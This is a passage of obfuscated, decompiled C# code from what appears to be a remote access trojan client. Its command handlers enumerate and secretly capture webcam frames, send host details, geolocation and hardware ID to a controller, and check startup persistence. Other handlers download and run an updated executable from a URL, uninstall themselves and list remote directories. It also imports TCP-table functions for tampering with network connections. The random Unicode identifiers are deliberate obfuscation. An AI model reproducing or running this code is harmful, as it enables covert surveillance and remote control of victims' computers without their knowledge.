        ptr = (IntPtr) ((long) ptr + (long) Marshal.SizeOf((object) structure2));
      }
    }
    finally
    {
      Marshal.FreeHGlobal(num2);
    }
    return 敔ݤ㘲ꅨ䎉뢒ሲƆ젟捽ᥡ뉨톹픂ꢟ晹ꎧArray;
  }

  [DllImport("iphlpapi.dll", EntryPoint = "GetExtendedTcpTable", SetLastError = true)]
  private static extern uint 滦ᨬ\u221A폾佱剤鯈\uFFFDⰝ\uEB4D쪯ꜰ祐柴鉶ﷂ\uFFFD\u2731쟙邇(
    IntPtr pTcpTable,
    ref int dwOutBufLen,
    bool sort,
    int ipVersion,
    쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.ޓ핏゙\uED53\uF8B1젹\uF1CF簠լ懶풙퀂䇜ᆨ唳㲉衆䃃\u22BF鲖 tblClass,
    uint reserved = 0);

  [DllImport("iphlpapi.dll", EntryPoint = "SetTcpEntry")]
  private static extern int 셼\u9FF3蚊蕉㕑ﯞԐ\uE97A\u2615Ɉꡣ摷懹ꪣ\uE4A2ㄷ輢봅જ睔(IntPtr pTcprow);

  public static void ᾫ\u296F阮쐢鎌냗묄鸷㯆\u9FF9鍽\u0EE0ᚫ\uEC63렝妣ᙖ䱅\uEB98탻(
    GetWebcams command,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    Dictionary<string, List<Size>> webcams = new Dictionary<string, List<Size>>();
    foreach (FilterInfo filterInfo in (CollectionBase) new ꕑ䎳칞ﮫ滦꾼\uFFFD㥍眬䜅\uF1F4䩸\uEE90벫ĥꕛ㽪뼬恎頳(젏㜿\u0F01䋏ﲘ\u136E\u2443ꐂҞ跈䮎걻瑓澇䵻ꧽ\uFFFD샔䰦믭.덾橶\u29E7\uFFFD轨ꙗ\uEFAFྦྷ魂儽佟蜺傉靭貦珊㘄쾣ູ缙))
    {
      List<Size> sizeList = new List<Size>();
      foreach (避蘌㸛蚌\uF08F无㓼㻅Ȝ巻\u193Dߋ엸嬸樒떏絗檿冒ΐ videoCapability in new VideoCaptureDevice(filterInfo.MonikerString).VideoCapabilities)
        sizeList.Add(videoCapability.\uE759瞇ꤒ鐥役㽴\u2B1B밍\uF8BF턍\u2BD2᱙룶盬茶닜꙽\u2ED9\uEEE3䢙);
      webcams.Add(filterInfo.Name, sizeList);
    }
    if (webcams.Count <= 0)
      return;
    new GetWebcamsResponse(webcams).Execute(client);
  }

  public static void 埨\u0EE2㿈㱄惟뎦ᶎ\uFFFD짫\u181E\uE3B7蚉뻢鵪\uF66B帹倖ﶎ\uFFFD畚(
    GetWebcam command,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.련蒷黙\u32DF菋鉐\uF86B\uEA72눌呸Č\u17EF\uEFBF柼藐뎟ꦷ抆镣萐 = client;
    쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.证杠\uF5E9泓\uFFFD\u2FE2㠷\uEA9B夔ꕛ涞ᧃ먖쾀診ﲽ헑\u24AA駽䰱 = true;
    쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.䀹\uEED1ئ갡軪\uFFFD嶧\uEB09흋\uFFFDٓ뜠㝓櫆䊞\uE2B3銑泦ﰁ셝 = command.Webcam;
    쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.쮞Ӛ\u2984组ຯ\u2F51\uFFFD羓ⲻ禧ペ킀Ⳡ\uFFFDꏤ\u263A\uE383䖠져쮃 = command.Resolution;
    if (쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.啣㲨쨢鵙랎曛ꘂ\uE481돽苋挩\u22BDﳁⲝ㴙卢괉遦\uFFFD\uEECD)
      return;
    쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.蹾\uF2E4썈摨ㆹは廼\uE57DḘရ㞂\uE9C6炶稢码糉\u0A43椼ꧩ䎙 = new VideoCaptureDevice(new ꕑ䎳칞ﮫ滦꾼\uFFFD㥍眬䜅\uF1F4䩸\uEE90벫ĥꕛ㽪뼬恎頳(젏㜿\u0F01䋏ﲘ\u136E\u2443ꐂҞ跈䮎걻瑓澇䵻ꧽ\uFFFD샔䰦믭.덾橶\u29E7\uFFFD轨ꙗ\uEFAFྦྷ魂儽佟蜺傉靭貦珊㘄쾣ູ缙)[command.Webcam].MonikerString);
    쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.蹾\uF2E4썈摨ㆹは廼\uE57DḘရ㞂\uE9C6炶稢码糉\u0A43椼ꧩ䎙.NewFrame += new 昧ᩩ㵵끧\u1CA7\uEC6B榽ػ쌶锎驂\u24E6\u0A50흢큙寤ಭ\u241C䶜烄(쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.\uFFFD\uF3B7\uF8E2膍\u0CF8ᤅ㮖튰飌\uF17Dᑟ윅攰ꗛἀ鎠颎緹扌왂);
    쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.蹾\uF2E4썈摨ㆹは廼\uE57DḘရ㞂\uE9C6炶稢码糉\u0A43椼ꧩ䎙.VideoResolution = 쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.蹾\uF2E4썈摨ㆹは廼\uE57DḘရ㞂\uE9C6炶稢码糉\u0A43椼ꧩ䎙.VideoCapabilities[command.Resolution];
    쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.蹾\uF2E4썈摨ㆹは廼\uE57DḘရ㞂\uE9C6炶稢码糉\u0A43椼ꧩ䎙.Start();
    쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.啣㲨쨢鵙랎曛ꘂ\uE481돽苋挩\u22BDﳁⲝ㴙卢괉遦\uFFFD\uEECD = true;
  }

  public static void \u00BD㗮\uFFFD\uFFFD⃔䛂៩鱚ᚙ䱻扏뽀\uE386\u1738\uA7CDͭ辧灌ǡ\uAA5D(
    DoWebcamStop command,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.证杠\uF5E9泓\uFFFD\u2FE2㠷\uEA9B夔ꕛ涞ᧃ먖쾀診ﲽ헑\u24AA駽䰱 = false;
    쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.啣㲨쨢鵙랎曛ꘂ\uE481돽苋挩\u22BDﳁⲝ㴙卢괉遦\uFFFD\uEECD = false;
    쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.련蒷黙\u32DF菋鉐\uF86B\uEA72눌呸Č\u17EF\uEFBF柼藐뎟ꦷ抆镣萐 = (\u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ) null;
    if (쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.蹾\uF2E4썈摨ㆹは廼\uE57DḘရ㞂\uE9C6炶稢码糉\u0A43椼ꧩ䎙 == null)
      return;
    쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.蹾\uF2E4썈摨ㆹは廼\uE57DḘရ㞂\uE9C6炶稢码糉\u0A43椼ꧩ䎙.NewFrame -= new 昧ᩩ㵵끧\u1CA7\uEC6B榽ػ쌶锎驂\u24E6\u0A50흢큙寤ಭ\u241C䶜烄(쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.\uFFFD\uF3B7\uF8E2膍\u0CF8ᤅ㮖튰飌\uF17Dᑟ윅攰ꗛἀ鎠颎緹扌왂);
    쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.蹾\uF2E4썈摨ㆹは廼\uE57DḘရ㞂\uE9C6炶稢码糉\u0A43椼ꧩ䎙.Stop();
    쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.蹾\uF2E4썈摨ㆹは廼\uE57DḘရ㞂\uE9C6炶稢码糉\u0A43椼ꧩ䎙 = (VideoCaptureDevice) null;
  }

  private static void \uFFFD\uF3B7\uF8E2膍\u0CF8ᤅ㮖튰飌\uF17Dᑟ윅攰ꗛἀ鎠颎緹扌왂(
    object sender,
    鷛荎쥞ం켈䭍\uE042ྵ퐱э᳜멢鹞ন鞂䊖\u2762ꗙ쉷ె e)
  {
    if (!쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.啣㲨쨢鵙랎曛ꘂ\uE481돽苋挩\u22BDﳁⲝ㴙卢괉遦\uFFFD\uEECD)
      쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.蹾\uF2E4썈摨ㆹは廼\uE57DḘရ㞂\uE9C6炶稢码糉\u0A43椼ꧩ䎙.Stop();
    if (!쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.证杠\uF5E9泓\uFFFD\u2FE2㠷\uEA9B夔ꕛ涞ᧃ먖쾀診ﲽ헑\u24AA駽䰱)
      return;
    using (MemoryStream memoryStream = new MemoryStream())
    {
      ((Image) e.Frame.Clone()).Save((Stream) memoryStream, ImageFormat.Bmp);
      new GetWebcamResponse(memoryStream.ToArray(), 쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.䀹\uEED1ئ갡軪\uFFFD嶧\uEB09흋\uFFFDٓ뜠㝓櫆䊞\uE2B3銑泦ﰁ셝, 쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.쮞Ӛ\u2984组ຯ\u2F51\uFFFD羓ⲻ禧ペ킀Ⳡ\uFFFDꏤ\u263A\uE383䖠져쮃).Execute(쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.련蒷黙\u32DF菋鉐\uF86B\uEA72눌呸Č\u17EF\uEFBF柼藐뎟ꦷ抆镣萐);
      memoryStream.Close();
    }
    쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.证杠\uF5E9泓\uFFFD\u2FE2㠷\uEA9B夔ꕛ涞ᧃ먖쾀診ﲽ헑\u24AA駽䰱 = false;
  }

  public static void 㧆抓퇲\uE0CFź揍끲熐퇸폙\uE294㘄䢵\uFFFDꚔ㷽싊\uE412\u9FFDᥞ(
    GetAuthentication command,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    \u2213犥ﬞ暍\uEF18덜쭐\uFFFD晁ꐞ\uFFFDབ劉项\uE1AC놝\uE0AFꬨ\uFFFDᴎ.ᥧ澪矑\uF144晅ﴓ冮ೂ褳畺뚠궷\uEEF6秪彀Ⲧ掲焲幈ﲥ();
    new GetAuthenticationResponse(鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.結ك먀얆ⅳ\uEF2A\uF4CD誙\u2258靪㐮\u2E4D\u21CA枆匜뎩裈ﮟ\uF39D\uA4AE, 청瓧곴㩵栯僃䔵텑鏪䏫\u2E98슔头撤孖䵰傎ȍϯ띂.FullName, 햫耷昢ￎ蟦턈㞊\uFFFD拐錡\u2B32펒\uE754岁ꆝ\uFFFD銵裏Ґ\u2632.\u23E7䳓㒀㠉쬙\uA95B壳\uE222ꍹ폊Ą僦ꇊ빂詮鸦\u08E0顔䫺卓(), \u2213犥ﬞ暍\uEF18덜쭐\uFFFD晁ꐞ\uFFFDབ劉项\uE1AC놝\uE0AFꬨ\uFFFDᴎ.GeoInfo.Country, \u2213犥ﬞ暍\uEF18덜쭐\uFFFD晁ꐞ\uFFFDབ劉项\uE1AC놝\uE0AFꬨ\uFFFDᴎ.GeoInfo.CountryCode, \u2213犥ﬞ暍\uEF18덜쭐\uFFFD晁ꐞ\uFFFDབ劉项\uE1AC놝\uE0AFꬨ\uFFFDᴎ.GeoInfo.Region, \u2213犥ﬞ暍\uEF18덜쭐\uFFFD晁ꐞ\uFFFDབ劉项\uE1AC놝\uE0AFꬨ\uFFFDᴎ.GeoInfo.City, \u2213犥ﬞ暍\uEF18덜쭐\uFFFD晁ꐞ\uFFFDབ劉项\uE1AC놝\uE0AFꬨ\uFFFDᴎ.ImageIndex, 㞚钷鳀콏ᯋ\uAA5FꇧΤ碽妗ᄠ勌Ⲭ詥要퓹䍉헱\uAA5E祁.HardwareId, 햫耷昢ￎ蟦턈㞊\uFFFD拐錡\u2B32펒\uE754岁ꆝ\uFFFD銵裏Ґ\u2632.\u2A83莤\uEEF7鑔羽䝛톹䓭ⴃ㕢‮\uEA57懰\uE527\uEA49晲\u08D2셙糭뚽(), 飑છ蟋\uFE5Cᰎ\u0D51\u2B72\u254D陠ᜫ\uFFFD瑛놺ḕ묄钯䕽\uE400凧ව.\uE58E\u2CF7ꅪ偱쐭ꃤ\uA638洢僘ꖯ쌴겂ሧ\u3319\uF1DD칳貱뱕\uEFF1ꩰ(), 鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.讲ﳂ丰辱\u28FC瘅罘\uED20\uF5B6\uE707\uE9B4\uA836筥푌鰠솒ꄙ擔息\uEBA9).Execute(client);
    if (!ࢥ博씰\uEACA䘿湣͞\uFFFD閱\u246F愮茪忛챗Ǆꕊ棑Ạ\uE9EAኯ.AddToStartupFailed)
      return;
    Thread.Sleep(2000);
    new SetStatus("Adding to startup failed.").Execute(client);
  }

  public static void \u0F75ܔ\uFFFD춇윕\u2709杲쾻寜\uFFFD䲀椸\u087A뼁얽\u2F4C짂듕䖒\uEA88(
    DoClientUpdate command,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: variable of a compiler-generated type
    쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.Ꮆ䰜\uFFFD\uF0FC\u2220\uEB6C牀檞믠\uED10싘쓒瑻\uE788驸柊\uFFFD쾳ꂾﻜ Ꮆ䰜牀檞믠싘쓒瑻驸柊쾳ꂾﻜ = new 쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.Ꮆ䰜\uFFFD\uF0FC\u2220\uEB6C牀檞믠\uED10싘쓒瑻\uE788驸柊\uFFFD쾳ꂾﻜ();
    // ISSUE: reference to a compiler-generated field
    Ꮆ䰜牀檞믠싘쓒瑻驸柊쾳ꂾﻜ.餯ጠ馰\uE9FB\uE2A4響뿆舭ᱴ詏狂孋䯑ス뙑\u2A39㡾鸌貿\uFFFD = client;
    // ISSUE: reference to a compiler-generated field
    Ꮆ䰜牀檞믠싘쓒瑻驸柊쾳ꂾﻜ.\uE55D㑬鏦찳ᗶү\u28FE\u2546㯡\u0D75靜\uF441췊汜\u2627턼郓‮覮\uF124 = command;
    // ISSUE: reference to a compiler-generated field
    if (string.IsNullOrEmpty(Ꮆ䰜牀檞믠싘쓒瑻驸柊쾳ꂾﻜ.\uE55D㑬鏦찳ᗶү\u28FE\u2546㯡\u0D75靜\uF441췊汜\u2627턼郓‮覮\uF124.DownloadURL))
    {
      // ISSUE: reference to a compiler-generated field
      if (!쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.螦섬쓮Ṣ녍퍆ᷯ쑘㒬䪕踃돖ᑰ臞嚺䛚㦋嘷嚠渢.ContainsKey(Ꮆ䰜牀檞믠싘쓒瑻驸柊쾳ꂾﻜ.\uE55D㑬鏦찳ᗶү\u28FE\u2546㯡\u0D75靜\uF441췊汜\u2627턼郓‮覮\uF124.ID))
      {
        // ISSUE: reference to a compiler-generated field
        쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.螦섬쓮Ṣ녍퍆ᷯ쑘㒬䪕踃돖ᑰ臞嚺䛚㦋嘷嚠渢.Add(Ꮆ䰜牀檞믠싘쓒瑻驸柊쾳ꂾﻜ.\uE55D㑬鏦찳ᗶү\u28FE\u2546㯡\u0D75靜\uF441췊汜\u2627턼郓‮覮\uF124.ID, \uF19D䫆䖭縤괒渚\u29BB㥽ⴐ곰䥛\uEBFA\uF31A\uEC2C\uF8FC吅ᣮ\uE9D3ꋼ綄.\uE0F1\uE1AF\u240D蹾㳝Ỳ숯菎핡쑸\u3360牜쾩燌\u3218骈\uE5BB\uFFFD유Ꝑ(".exe"));
      }
      // ISSUE: reference to a compiler-generated field
      string str = 쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.螦섬쓮Ṣ녍퍆ᷯ쑘㒬䪕踃돖ᑰ臞嚺䛚㦋嘷嚠渢[Ꮆ䰜牀檞믠싘쓒瑻驸柊쾳ꂾﻜ.\uE55D㑬鏦찳ᗶү\u28FE\u2546㯡\u0D75靜\uF441췊汜\u2627턼郓‮覮\uF124.ID];
      try
      {
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        if (Ꮆ䰜牀檞믠싘쓒瑻驸柊쾳ꂾﻜ.\uE55D㑬鏦찳ᗶү\u28FE\u2546㯡\u0D75靜\uF441췊汜\u2627턼郓‮覮\uF124.CurrentBlock == 0 && !\uF19D䫆䖭縤괒渚\u29BB㥽ⴐ곰䥛\uEBFA\uF31A\uEC2C\uF8FC吅ᣮ\uE9D3ꋼ綄.鷣抈ឈ䑔\uFFFD讣찚㗀\u21BD켨뉡뿞㾢纃礳\uFFFD\uE016튢\u2417\uEB00(Ꮆ䰜牀檞믠싘쓒瑻驸柊쾳ꂾﻜ.\uE55D㑬鏦찳ᗶү\u28FE\u2546㯡\u0D75靜\uF441췊汜\u2627턼郓‮覮\uF124.Block))
          throw new Exception("No executable file");
        ۼ薈깐㦡\uE0D2ﱾ綱\uFAFDή⃒蔦띌\u2320瀮\uE91F껧଼遃瞫都 ۼ薈깐㦡ﱾ綱Ή⃒蔦띌瀮껧଼遃瞫都 = new ۼ薈깐㦡\uE0D2ﱾ綱\uFAFDή⃒蔦띌\u2320瀮\uE91F껧଼遃瞫都(str);
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        if (!ۼ薈깐㦡ﱾ綱Ή⃒蔦띌瀮껧଼遃瞫都.㳨䣙쇶냷舚퍋䪨䎝婒潂\uE642꣔\u2451끯\uF437ᱯᝏ物\u0EA4켪(Ꮆ䰜牀檞믠싘쓒瑻驸柊쾳ꂾﻜ.\uE55D㑬鏦찳ᗶү\u28FE\u2546㯡\u0D75靜\uF441췊汜\u2627턼郓‮覮\uF124.Block, Ꮆ䰜牀檞믠싘쓒瑻驸柊쾳ꂾﻜ.\uE55D㑬鏦찳ᗶү\u28FE\u2546㯡\u0D75靜\uF441췊汜\u2627턼郓‮覮\uF124.CurrentBlock))
          throw new Exception(ۼ薈깐㦡ﱾ綱Ή⃒蔦띌瀮껧଼遃瞫都.LastError);
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        if (Ꮆ䰜牀檞믠싘쓒瑻驸柊쾳ꂾﻜ.\uE55D㑬鏦찳ᗶү\u28FE\u2546㯡\u0D75靜\uF441췊汜\u2627턼郓‮覮\uF124.CurrentBlock + 1 != Ꮆ䰜牀檞믠싘쓒瑻驸柊쾳ꂾﻜ.\uE55D㑬鏦찳ᗶү\u28FE\u2546㯡\u0D75靜\uF441췊汜\u2627턼郓‮覮\uF124.MaxBlocks)
          return;
        // ISSUE: reference to a compiler-generated field
        if (쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.螦섬쓮Ṣ녍퍆ᷯ쑘㒬䪕踃돖ᑰ臞嚺䛚㦋嘷嚠渢.ContainsKey(Ꮆ䰜牀檞믠싘쓒瑻驸柊쾳ꂾﻜ.\uE55D㑬鏦찳ᗶү\u28FE\u2546㯡\u0D75靜\uF441췊汜\u2627턼郓‮覮\uF124.ID))
        {
          // ISSUE: reference to a compiler-generated field
          쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.螦섬쓮Ṣ녍퍆ᷯ쑘㒬䪕踃돖ᑰ臞嚺䛚㦋嘷嚠渢.Remove(Ꮆ䰜牀檞믠싘쓒瑻驸柊쾳ꂾﻜ.\uE55D㑬鏦찳ᗶү\u28FE\u2546㯡\u0D75靜\uF441췊汜\u2627턼郓‮覮\uF124.ID);
        }
        // ISSUE: reference to a compiler-generated field
        new SetStatus("Updating...").Execute(Ꮆ䰜牀檞믠싘쓒瑻驸柊쾳ꂾﻜ.餯ጠ馰\uE9FB\uE2A4響뿆舭ᱴ詏狂孋䯑ス뙑\u2A39㡾鸌貿\uFFFD);
        // ISSUE: reference to a compiler-generated field
        \u2801䥃ᢓ矎ᚠ㑨䵦糩\uEAE8\u07FD뮡\u27FB瀯ꖎ\u28FC䳓\u2BC3\u1CCA梇\u2F09.\u2AF1\uFFFD䀈쑠즻畡\uF814녹\u2255䫈\u339E鶵鈗䨺㱅胹醳斵\uA954\u2CFC(Ꮆ䰜牀檞믠싘쓒瑻驸柊쾳ꂾﻜ.餯ጠ馰\uE9FB\uE2A4響뿆舭ᱴ詏狂孋䯑ス뙑\u2A39㡾鸌貿\uFFFD, str);
      }
      catch (Exception ex)
      {
        // ISSUE: reference to a compiler-generated field
        if (쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.螦섬쓮Ṣ녍퍆ᷯ쑘㒬䪕踃돖ᑰ臞嚺䛚㦋嘷嚠渢.ContainsKey(Ꮆ䰜牀檞믠싘쓒瑻驸柊쾳ꂾﻜ.\uE55D㑬鏦찳ᗶү\u28FE\u2546㯡\u0D75靜\uF441췊汜\u2627턼郓‮覮\uF124.ID))
        {
          // ISSUE: reference to a compiler-generated field
          쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.螦섬쓮Ṣ녍퍆ᷯ쑘㒬䪕踃돖ᑰ臞嚺䛚㦋嘷嚠渢.Remove(Ꮆ䰜牀檞믠싘쓒瑻驸柊쾳ꂾﻜ.\uE55D㑬鏦찳ᗶү\u28FE\u2546㯡\u0D75靜\uF441췊汜\u2627턼郓‮覮\uF124.ID);
        }
        \u2524ꍔ㻌䭣ǖ岓\uEE62꼩岠\uFFFD\u2E04꺅\u0F31ᮮ￺\u31BC袼쒲㒞誠.謼뾗\u3308\u204F쓛\u26D2\u2B18\uE191穞皝놞\uE6EF祕ᤃ迫ᱲ잋⁢啍빧(str);
        // ISSUE: reference to a compiler-generated field
        new SetStatus(string.Format("Update failed: {0}", (object) ex.Message)).Execute(Ꮆ䰜牀檞믠싘쓒瑻驸柊쾳ꂾﻜ.餯ጠ馰\uE9FB\uE2A4響뿆舭ᱴ詏狂孋䯑ス뙑\u2A39㡾鸌貿\uFFFD);
      }
    }
    else
    {
      // ISSUE: reference to a compiler-generated method
      new Thread(new ThreadStart(Ꮆ䰜牀檞믠싘쓒瑻驸柊쾳ꂾﻜ.龩肣뒊䈵㽱㞸螙痧何\uF868晇簯\uFFFDὖṒ塋覩弾튘溳)).Start();
    }
  }

  public static void 扗Ꜽ놦㬮㷐㾥ᑄᴡ䔸ꯑ햰\u286D츍\uF26E푙픷\u25CB\u27C5쭓焍(
    DoClientUninstall command,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    new SetStatus("Uninstalling... bye ;(").Execute(client);
    ٺ槊춀괲靨‪쁆笻쯷\u1C9B\uA87C\uFFFD䥥밑窍䲍乛쁘ꭀ䆺.\uF425ᜄ翠\uE4D6䮷줾眸냭鲲Ⰻ\u2878镯귥捷ⰺ즄\uFFFD\uF8B0ᵏ䞐(client);
  }

  public static void 즥갵㷞긧\u2B25뾖惌嘍놶ʿ૪蚞菝菱㢠\u236F如\uE596\uFFFD\u0DF5(
    GetDirectory command,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: variable of a compiler-generated type
    쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.曙Ḁ谸롃ᦚ䌉閿잁臫穹ᩞ畩\uE822菌笎趒\u31D8\uF86F毝둢 ḁ谸롃ᦚ䌉閿잁臫穹ᩞ畩菌笎趒毝둢 = new 쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.曙Ḁ谸롃ᦚ䌉閿잁臫穹ᩞ畩\uE822菌笎趒\u31D8\uF86F毝둢();
    // ISSUE: reference to a compiler-generated field
    ḁ谸롃ᦚ䌉閿잁臫穹ᩞ畩菌笎趒毝둢.\u26F4\u25ABз큺\u2F2D皮楛䃃샘M퇅턣ꇤ葀殯\u2FC2釼\uFFFD裞ꖚ = false;
    // ISSUE: reference to a compiler-generated field
    ḁ谸롃ᦚ䌉閿잁臫穹ᩞ畩菌笎趒毝둢.\uEF3E瑁\u177Eᤩ\uE492奩쑘퇊嶥冴쫌䃃벘抾ꢼ菗㔜剂\uF7D7낈 = (string) null;
    // ISSUE: reference to a compiler-generated method
    Action<string> action = new Action<string>(ḁ谸롃ᦚ䌉閿잁臫穹ᩞ畩菌笎趒毝둢.䋼涼ϋ䇎离驄\u24A5ր\uF7F0卶㫤ꁒ짃ế扎疴蕱ꅐ䝌\uFAEF);
    try
    {
      DirectoryInfo directoryInfo1 = new DirectoryInfo(command.RemotePath);
      FileInfo[] files1 = directoryInfo1.GetFiles();
      DirectoryInfo[] directories = directoryInfo1.GetDirectories();
      string[] files2 = new string[files1.Length];
      long[] filessize = new long[files1.Length];
      string[] folders = new string[directories.Length];
      int index1 = 0;
      foreach (FileInfo fileInfo in files1)
      {
        files2[index1] = fileInfo.Name;
        filessize[index1] = fileInfo.Length;
        ++index1;
      }
      if (files2.Length == 0)
      {
        files2 = new string[1]{ "$E$" };
        filessize = new long[1];
      }
      int index2 = 0;
      foreach (DirectoryInfo directoryInfo2 in directories)
      {
        folders[index2] = directoryInfo2.Name;
        ++index2;
      }
      if (folders.Length == 0)
        folders = new string[1]{ "$E$" };
      new GetDirectoryResponse(files2, folders, filessize).Execute(client);
    }
    catch (UnauthorizedAccessException ex)
    {
      action("GetDirectory No permission");
    }
    catch (SecurityException ex)
    {
      action("GetDirectory No permission");
    }
    catch (PathTooLongException ex)
    {
      action("GetDirectory Path too long");
    }
    catch (DirectoryNotFoundException ex)
    {
      action("GetDirectory Directory not found");
    }
    catch (FileNotFoundException ex)
    {
      action("GetDirectory File not found");
    }
    catch (IOException ex)
    {
      action("GetDirectory I/O error");
    }
    catch (Exception ex)
    {
      action("GetDirectory Failed");
    }
    finally
    {
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
